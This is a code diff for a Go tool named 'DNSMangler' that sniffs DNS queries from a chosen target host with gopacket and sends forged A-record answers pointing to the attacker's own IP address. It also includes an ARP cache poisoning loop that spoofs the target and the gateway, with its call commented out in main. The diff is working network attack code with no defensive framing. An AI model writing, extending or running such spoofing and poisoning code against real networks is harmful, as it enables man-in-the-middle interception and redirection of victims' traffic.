@@ -2,9 +2,7 @@ package main;
 
 import(
 	"flag"
-	"io"
 	"fmt"
-	"log"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"github.com/google/gopacket"
@@ -12,7 +10,13 @@ import(
 	"time"
 )
 
-var err error;
+var (
+	err            error;
+	handle         *pcap.Handle;
+	ipAddr         net.IP;
+	macAddr        net.HardwareAddr;
+	target         string
+)
 
 func main(){
 
@@ -24,21 +28,27 @@ func main(){
 	
 	flag.Parse();
 
-	handle, err := pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever);
-	checkError(err);
-	defer handle.Close();
+	fmt.Print("Welcome to the DNSMangler!\n");
+	handle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever);
+	checkError(err)
 
-	//go arpPoison(*interfacePtr, *targetPtr, *targetMAC, *gatewayPtr, *gatewayMAC, handle);
-	mangleDNS(handle, *interfacePtr, *targetPtr);
+	err = handle.SetBPFFilter("dst port 53")
+	checkError(err);
+
+	defer handle.Close()
+
+	macAddr, ipAddr = grabAddresses(*interfacePtr)
+	target = *targetPtr
+	
+	//go arpPoison(*targetPtr, *targetMAC, *gatewayPtr, *gatewayMAC, handle);
+	mangleDNS();
 }
 
-func arpPoison(iface, target, targetMAC, gateway, gatewayMAC string, handle *pcap.Handle){
-	
-	hostMac, host := grabAddresses(iface);
+func arpPoison(target, targetMAC, gateway, gatewayMAC string){
 	
 	ethernetPacket := layers.Ethernet{};
-	ethernetPacket.DstMAC, err = net.ParseMAC(targetMAC); 
-	ethernetPacket.SrcMAC, err = net.ParseMAC(hostMac);
+	ethernetPacket.DstMAC, _ = net.ParseMAC(targetMAC); 
+	ethernetPacket.SrcMAC = macAddr 
 	
 	arpPacket := layers.ARP{};
 	arpPacket.AddrType = layers.LinkTypeEthernet;
@@ -47,8 +57,8 @@ func arpPoison(iface, target, targetMAC, gateway, gatewayMAC string, handle *pca
 	arpPacket.ProtAddressSize = 4;
 	arpPacket.Operation = 2;
 
-	arpPacket.SourceHwAddress, err = net.ParseMAC(hostMac);
-	arpPacket.SourceProtAddress = net.IP(host);
+	arpPacket.SourceHwAddress = macAddr;
+	arpPacket.SourceProtAddress = net.IP(ipAddr);
 	arpPacket.DstHwAddress, err = net.ParseMAC("FF:FF:FF:FF:FF:FF");
 	arpPacket.DstProtAddress = net.IP(target);
 
@@ -60,19 +70,19 @@ func arpPoison(iface, target, targetMAC, gateway, gatewayMAC string, handle *pca
 
 	for {
 		//poison target
-		writePoison(handle, arpPacket, ethernetPacket);
+		writePoison(arpPacket, ethernetPacket);
 		//poison gateway
-		writePoison(handle, gwARPPacket, gwEthernetPacket);
+		writePoison(gwARPPacket, gwEthernetPacket);
 
 		time.Sleep(1 * time.Second);
 	}
 		
 }
 
-func writePoison(handle *pcap.Handle, arpPacket layers.ARP, etherPacket layers.Ethernet){
+func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
 	buf := gopacket.NewSerializeBuffer();
 	opts := gopacket.SerializeOptions{};
-
+	
 	gopacket.SerializeLayers(buf, opts, &etherPacket, &arpPacket);
 	packetData := buf.Bytes();
 	
@@ -80,22 +90,49 @@ func writePoison(handle *pcap.Handle, arpPacket layers.ARP, etherPacket layers.E
 	checkError(err);
 }
 
-func mangleDNS(handle *pcap.Handle, iface, target string){
+func mangleDNS(){
 
+	var ethernetLayer layers.Ethernet
+	var ipLayer       layers.IPv4
+	var dnsLayer      layers.DNS
+	var udpLayer      layers.UDP
+	
+	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
+	decoded := make([]gopacket.LayerType, 0, 4)
+	
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
 		packet, err := packetSource.NextPacket() 
-		if err == io.EOF {
-			break
-		} else if err != nil {
-			log.Println("Error:", err)
-			continue;
+		checkError(err)
+
+		err = decoder.DecodeLayers(packet.Data(), &decoded)
+		checkError(err)
+
+		if len(decoded) != 4 {
+			fmt.Print("Not enough layers\n")
+			continue
 		}
-		if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
-			ipLayer := packet.Layer(layers.LayerTypeIPv4);
-			fmt.Printf("%d", dnsLayer.Contents.ID) 
-			// handlePacket(ipLayer.(*layers.IPv4), dnsLayer.(*layers.DNS));
+
+		buffer := craftAnswer(&ethernetLayer, &ipLayer, &dnsLayer, &udpLayer)
+		if buffer == nil {
+			fmt.Print("Buffer error, returned nil.\n")
+			continue
 		}
+
+		err = decoder.DecodeLayers(buffer, &decoded)
+		checkError(err)
+		for i := range decoded {
+			fmt.Println(decoded[i])
+		}
+
+		fmt.Printf("IP src %v\n", ipLayer.SrcIP)
+		fmt.Printf("IP dst %v\n", ipLayer.DstIP)
+		fmt.Printf("UDP src port: %v\n", udpLayer.SrcPort)
+		fmt.Printf("UDP dst port: %v\n", udpLayer.DstPort)
+		fmt.Printf("DNS Quy count: %v\n", dnsLayer.QDCount)
+		
+		err = handle.WritePacketData(buffer);
+		checkError(err);
 	}
 }
 /* 
@@ -110,19 +147,54 @@ func mangleDNS(handle *pcap.Handle, iface, target string){
     ABOUT:
     Performs packet sniffing using gopacket (libpcap). 
 */
-// func handlePacket(ipLayer *layers.IPv4, dnsLayer *layers.DNS){
+func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte {
 
-// 	ip := &layers.IPv4{
-// 		SrcIP: net.IP{,
-// 		DstIP: net.IP{5, 6, 7, 8},
-// 		// etc...
-// 	}
-	
-// 	dns := &layers.DNS{
+	//if not a question return
+	if dnsLayer.QR || ipLayer.SrcIP.String() != target {
+		return nil;
+	}
 
-// 	}
+	ethMac := ethernetLayer.DstMAC
+	ethernetLayer.DstMAC = ethernetLayer.SrcMAC
+	ethernetLayer.SrcMAC = ethMac
+
+	ipSrc := ipLayer.SrcIP
+	ipLayer.SrcIP = ipLayer.DstIP
+	ipLayer.DstIP = ipSrc
+
+	srcPort := udpLayer.SrcPort
+	udpLayer.SrcPort = udpLayer.DstPort
+	udpLayer.DstPort = srcPort
+	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	checkError(err);
 	
-// 	buf := gopacket.NewSerializeBuffer()
-// 	opts := gopacket.SerializeOptions{}  // See SerializeOptions for more details.
-// 	err := ip.SerializeTo(&buf, opts)
-// }
+	var answer layers.DNSResourceRecord;
+	answer.Type = layers.DNSTypeA
+	answer.Class = layers.DNSClassIN
+	answer.TTL = 200
+	answer.IP = ipAddr
+
+	dnsLayer.QR = true
+	
+	for _, q := range dnsLayer.Questions {
+		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
+			continue
+		}
+
+		answer.Name = q.Name
+
+		dnsLayer.Answers = append(dnsLayer.Answers, answer)
+		dnsLayer.ANCount = dnsLayer.ANCount + 1
+	}
+	
+	buf := gopacket.NewSerializeBuffer();
+	opts := gopacket.SerializeOptions{
+		FixLengths: true,
+		ComputeChecksums: true,
+	};
+	
+	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, dnsLayer);
+	checkError(err);
+
+	return buf.Bytes()
+}
